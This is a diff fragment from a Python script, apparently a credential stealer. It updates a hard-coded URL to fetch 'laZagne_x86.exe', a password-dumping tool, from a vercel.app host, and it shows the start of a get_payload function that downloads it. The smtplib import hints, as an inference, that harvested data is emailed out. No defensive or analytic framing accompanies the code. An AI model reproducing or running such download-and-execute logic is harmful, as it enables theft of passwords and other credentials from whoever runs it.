@@ -4,7 +4,7 @@ import smtplib
 import requests
 import os
 
-URL = "https://smtps.vercel.app/laZagne_x86.exe"
+URL = "https://smtps-one.vercel.app/laZagne_x86.exe"
 
 def get_payload(url):
     get_request = requests.get(url)
